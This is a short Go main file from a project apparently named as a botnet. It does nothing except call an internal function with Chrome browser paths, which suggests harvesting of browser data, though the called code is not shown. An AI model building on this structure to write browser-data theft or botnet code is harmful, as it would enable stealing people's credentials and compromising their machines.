package main

import (
	"botnetgolang/internal"
	"botnetgolang/internal/model"
)

func main() {

	internal.MainBL(model.GetChromePaths())

}
